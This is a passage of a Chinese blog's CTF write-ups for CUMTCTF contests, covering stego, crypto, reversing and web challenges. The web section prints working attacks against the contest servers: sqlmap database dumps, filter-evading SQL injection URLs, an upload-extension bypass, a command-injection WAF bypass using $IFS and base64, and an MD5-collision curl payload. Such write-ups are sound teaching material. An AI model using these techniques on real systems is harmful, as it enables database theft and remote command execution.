title=\"学姐真美\"></a>学姐真美</h2><p>下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可</p>\n<p><img src=\"/2018/12/07/cumtctf/16.png\" alt=\"repair\"></p>\n<p>是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可</p>\n<p><img src=\"/2018/12/07/cumtctf/17.png\" alt=\"repair\"></p>\n<!-- flag{ChaoRan_is_beautiful!!!} -->\n<h2 id=\"md5\"><a href=\"#md5\" class=\"headerlink\" title=\"md5\"></a>md5</h2><p>哈希长度扩展攻击，和web里面的 <em>is hash safe?</em> 相同类型，所以原理就不多说了，直接上工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@kali:~# hashpump</span><br><span class=\"line\">Input Signature: 4dbe35eaea655b0a2b0d06391175b8a3</span><br><span class=\"line\">Input Data: r</span><br><span class=\"line\">Input Key Length: 18</span><br><span class=\"line\">Input Data to Add: snow</span><br></pre></td></tr></table></figure>\n<p>得到结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">65710003c2ff40389b064d3a020487bd</span><br><span class=\"line\">r\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00snow</span><br></pre></td></tr></table></figure>\n<p>第一行md5提交，第二行在前面加上 <strong>cy</strong> 在将 <code>\\x</code> 换成空格，字母换成16进制表示即可，最终为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">63 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 73 6E 6F 77</span><br></pre></td></tr></table></figure>\n<p>提交即可得到flag</p>\n<h2 id=\"大家来找茬\"><a href=\"#大家来找茬\" class=\"headerlink\" title=\"大家来找茬\"></a>大家来找茬</h2><p>既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">compare 00000000.png 00000668.png 3.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2018/12/07/cumtctf/32.png\" alt></p>\n<h2 id=\"据说是个签到题\"><a href=\"#据说是个签到题\" class=\"headerlink\" title=\"据说是个签到题\"></a>据说是个签到题</h2><p>流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 <code>GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\\r\\n</code> ，感觉应该上传了什么东西，于是过滤tcp包 <code>tcp contains &quot;upload&quot;</code> 发现了数据传输，从第二个开始追踪tcp流</p>\n<p><img src=\"/2018/12/07/cumtctf/15.png\" alt></p>\n<p>发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto <span class=\"keyword\">import</span> Random</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(encrypted, passphrase)</span>:</span></span><br><span class=\"line\">  IV = encrypted[:<span class=\"number\">16</span>]</span><br><span class=\"line\">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> aes.decrypt(encrypted[<span class=\"number\">16</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(message, passphrase)</span>:</span></span><br><span class=\"line\">  IV = message[:<span class=\"number\">16</span>]</span><br><span class=\"line\">  length = <span class=\"number\">16</span></span><br><span class=\"line\">  count = len(message)</span><br><span class=\"line\">  padding = length - (count % length)</span><br><span class=\"line\">  message = message + <span class=\"string\">\"\\0\"</span> * padding</span><br><span class=\"line\">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> aes.encrypt(message)</span><br><span class=\"line\">IV = <span class=\"string\">'YUFHJKVWEASDGQDH'</span></span><br><span class=\"line\">a = <span class=\"string\">\"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==\"</span></span><br><span class=\"line\">b = base64.b64decode(a)</span><br><span class=\"line\"><span class=\"keyword\">print</span> decrypt(b,<span class=\"string\">\"Qq4wdrhhyEWe4qBF\"</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"萌萌哒\"><a href=\"#萌萌哒\" class=\"headerlink\" title=\"萌萌哒\"></a>萌萌哒</h2><p>颜文字密码(aaencode)，在线解码一下</p>\n<blockquote>\n<p>alert(“3Nc0d3.txt”)</p>\n</blockquote>\n<p>访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag</p>\n<!-- flag{My_Br@iN_is_B00m_@_@} -->\n<h2 id=\"魂斗罗\"><a href=\"#魂斗罗\" class=\"headerlink\" title=\"魂斗罗\"></a>魂斗罗</h2><p>下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下</p>\n<p><img src=\"/2018/12/07/cumtctf/30.png\" alt></p>\n<p>然后开启1p模式通过即可，一共好像是8关</p>\n<p><img src=\"/2018/12/07/cumtctf/31.png\" alt></p>\n<p>注意flag里面的字符是5不是s！</p>\n<!-- hctf{ju5tf0rfun} -->\n<h2 id=\"传感器2\"><a href=\"#传感器2\" class=\"headerlink\" title=\"传感器2\"></a>传感器2</h2><p>前面一道题目的加强版， 按照之前题目的步骤求一下ID值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">45psi: fffffed31f635055f8</span><br><span class=\"line\">30psi: fffffed31f425055d7</span><br></pre></td></tr></table></figure>\n<p>可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=&gt;2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># py3</span></span><br><span class=\"line\">a = (int(<span class=\"string\">'63'</span>,<span class=\"number\">16</span>)-int(<span class=\"string\">'42'</span>,<span class=\"number\">16</span>))/<span class=\"number\">15</span> * <span class=\"number\">5</span></span><br><span class=\"line\">b = int(<span class=\"string\">'42'</span>,<span class=\"number\">16</span>) - int(a)</span><br><span class=\"line\">print(hex(b))</span><br><span class=\"line\"><span class=\"comment\"># @ans=0x37</span></span><br></pre></td></tr></table></figure>\n<p>补上ID之后求校验码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">\"feb757375055\"</span></span><br><span class=\"line\">sum = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(a)//<span class=\"number\">2</span>):</span><br><span class=\"line\">    sum += int(a[i*<span class=\"number\">2</span>:i*<span class=\"number\">2</span>+<span class=\"number\">2</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\">print(hex(sum%<span class=\"number\">256</span>))</span><br><span class=\"line\"><span class=\"comment\"># @ans=0xe8</span></span><br></pre></td></tr></table></figure>\n<p>那么最终的明文为 <code>FFFFFEB757375055E8</code></p>\n<!-- flag{FFFFFEB757375055E8} -->\n<h2 id=\"猜猜看\"><a href=\"#猜猜看\" class=\"headerlink\" title=\"猜猜看\"></a>猜猜看</h2><p>题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">jpseek.exe guess_flag.jpg flag.txt</span><br></pre></td></tr></table></figure>\n<p>提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">\"\"</span> <span class=\"comment\"># 此处应为flag.txt中的二进制串</span></span><br><span class=\"line\">hex_s = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(s)//<span class=\"number\">8</span>):</span><br><span class=\"line\">    hex_s += hex(int(s[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>],<span class=\"number\">2</span>))[<span class=\"number\">2</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">print(hex_s)</span><br></pre></td></tr></table></figure>\n<p>在线解码为字符串</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1&#x2F;ZOUGIgHlqN2eqtoYljfQfuGiQ&#x2F;Pr9+&#x2F;cv4P&#x2F;5609&#x2F;APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7&#x2F;7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux&#x2F;l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ&#x2F;u5oyT08mD&#x2F;YPL&#x2F;XuTP&#x2F;EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA&#x2F;kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI&#x2F;MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z&#x2F;hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y&#x2F;22wk7PaJTfqPv1E&#x2F;bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4&#x2F;ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k&#x2F;tql2wX3e&#x2F;pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH&#x2F;3HxZ95&#x2F;r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv&#x2F;MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t&#x2F;4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT&#x2F;P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm&#x2F;SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC&#x2F;Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ&#x2F;emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl&#x2F;t03t4J9&#x2F;rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq&#x2F;&#x2F;mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB&#x2F;kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk&#x2F;8r9&#x2F;TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg&#x3D;&#x3D;&quot;&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure>\n<p>一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag</p>\n<p><img src=\"/2018/12/07/cumtctf/33.png\" alt=\"answer\"></p>\n<p>这题还发现个stegdetect工具，收获挺大。</p>\n<!-- flag{owid0-o91hf-9iahg} -->\n<h1 id=\"REVERSE\"><a href=\"#REVERSE\" class=\"headerlink\" title=\"REVERSE\"></a>REVERSE</h1><h2 id=\"Gift\"><a href=\"#Gift\" class=\"headerlink\" title=\"Gift\"></a>Gift</h2><p>题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apktool d Gift.apk</span><br></pre></td></tr></table></figure>\n<p>在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。</p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"CUMTCTF第二轮月赛","url":"/2019/01/30/cumtctf2/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p>\n<a id=\"more\"></a>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$white_list = range(<span class=\"number\">0</span>,<span class=\"number\">9</span>); </span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'flag.php'</span>); </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_REQUEST[<span class=\"string\">'0ver'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_REQUEST[<span class=\"string\">'0ver1'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_REQUEST[<span class=\"string\">'0ver2'</span>]))&#123; </span><br><span class=\"line\">    $a = $_REQUEST[<span class=\"string\">'0ver'</span>]; </span><br><span class=\"line\">    $b = $_REQUEST[<span class=\"string\">'0ver1'</span>]; </span><br><span class=\"line\">    $c = $_REQUEST[<span class=\"string\">'0ver2'</span>]; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(@ereg(<span class=\"string\">\"^[0-9]+$\"</span>, $a) === <span class=\"keyword\">FALSE</span>)&#123; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'no must be number'</span>; </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array($a,$white_list))&#123; </span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen($a)&gt;<span class=\"number\">1</span>)&#123; </span><br><span class=\"line\">                <span class=\"keyword\">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src='dark.png'&gt;&lt;br&gt;\"</span>; </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> $flag; </span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">                <span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">\"you can do it!!!\"</span>; </span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">                 </span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">'you no dark'</span>; </span><br><span class=\"line\">            &#125; </span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'you are so dark'</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;     </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> </span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p>很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 <code>03</code>类似的即可绕过，也可以使用<code>%00</code>截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可</p>\n<p>paylaod：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -v http:&#x2F;&#x2F;202.119.201.199:32790?0ver&#x3D;02 --data &quot;0ver1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"SimpleUpload\"><a href=\"#SimpleUpload\" class=\"headerlink\" title=\"SimpleUpload\"></a>SimpleUpload</h2><p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p>\n<p>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。</p>\n<p><img src=\"https://i.imgur.com/kDxBrxT.png\" alt>    </p>\n<h2 id=\"小型线上赌场\"><a href=\"#小型线上赌场\" class=\"headerlink\" title=\"小型线上赌场\"></a>小型线上赌场</h2><p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi -r index.swp</span><br></pre></td></tr></table></figure>\n<p>代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $invest = $_GET[<span class=\"string\">'invest'</span>];</span><br><span class=\"line\">    $rand = rand(<span class=\"number\">2</span>,<span class=\"number\">50</span>);</span><br><span class=\"line\">    $len = strlen(trim($_GET[<span class=\"string\">'invest'</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($_GET <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!is_numeric($value)||$value == <span class=\"string\">'0'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'no no no!'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $money = number_format($invest*$rand);</span><br><span class=\"line\">    $money = intval(str_replace(<span class=\"string\">','</span>,<span class=\"string\">''</span>,$money));</span><br><span class=\"line\">    $guess = intval($_GET[<span class=\"string\">'guess'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag</p>\n<p><img src=\"https://i.loli.net/2019/01/24/5c49424c2fdc8.png\" alt=\"抓包爆破\"></p>\n<p><img src=\"https://i.loli.net/2019/01/24/5c4942d3766a8.png\" alt=\"flag\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"SimpleSQLi\"><a href=\"#SimpleSQLi\" class=\"headerlink\" title=\"SimpleSQLi\"></a>SimpleSQLi</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>\n<p>数据库名为security</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>\n<p>表名flagishere</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere --columns --threads&#x3D;10</span><br></pre></td></tr></table></figure>\n<p>列名id,flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads&#x3D;10</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"真的简单。。\"><a href=\"#真的简单。。\" class=\"headerlink\" title=\"真的简单。。\"></a>真的简单。。</h2><p>随手fuzz一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27</span><br></pre></td></tr></table></figure>\n<p>报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27--+</span><br></pre></td></tr></table></figure>\n<p>可以正常返回，猜测是单引号注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20or%201&#x3D;1--+</span><br></pre></td></tr></table></figure>\n<p>无正确回显，猜测可能是or有问题，换 <code>||</code> 试一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;length(database())--+</span><br></pre></td></tr></table></figure>\n<p>果然返回正确，数据库长度为3</p>\n<p>题目过滤了or，但是可以绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20oorr%201&#x3D;1--+</span><br></pre></td></tr></table></figure>\n<p>爆列数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;3 oorrder by 3--+</span><br></pre></td></tr></table></figure>\n<p>共有三列</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,database(),3--+</span><br></pre></td></tr></table></figure>\n<p>database:ctf</p>\n<p>接下来就是常规的注入了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>\n<p>table：ctf,flag </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>\n<p>列名：id,flag </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,flag,3 from flag--+</span><br></pre></td></tr></table></figure>\n<p>居然还有题目..</p>\n<blockquote>\n<p>flag in admin_08163314/exec.php </p>\n</blockquote>\n<p>访问一下，是个命令执行界面，过滤了空格，可用<code>$IFS</code>绕过，尝试列根目录但是失败了，猜测可能是<code>/</code>被过滤了，但是 <code>* .</code>没有被过滤，可以用来读文件exec.php</p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5df37356a.png\" alt></p>\n<p>可以得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waf_exec</span><span class=\"params\">($str)</span></span>&#123;</span><br><span class=\"line\">\t$black_str = <span class=\"string\">\"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\\?|@|\\+|\\/| )/i\"</span>;</span><br><span class=\"line\">\t$str = preg_replace($black_str, <span class=\"string\">\"\"</span>,$str);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (@$_POST[<span class=\"string\">'cmd'</span>]) &#123;</span><br><span class=\"line\">\t$cmd = waf_exec($_POST[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">\tsystem($cmd);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录</p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5e68be087.png\" alt></p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5e99549bc.png\" alt></p>\n<p>注意这里的flag_3314是个目录，还得继续列目录</p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5eea0c492.png\" alt></p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5f1453698.png\" alt></p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5f7396879.png\" alt></p>\n<p><img src=\"https://i.loli.net/2019/01/26/5c4c5f7398de3.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;3570d4d9c72a19c889140674827eeca5&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"SimpleSQLi2\"><a href=\"#SimpleSQLi2\" class=\"headerlink\" title=\"SimpleSQLi2\"></a>SimpleSQLi2</h2><p>fuzz测试了一下感觉是数字型注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;-1%20||%201&#x3D;1</span><br></pre></td></tr></table></figure>\n<p>接下来测试过滤规则</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 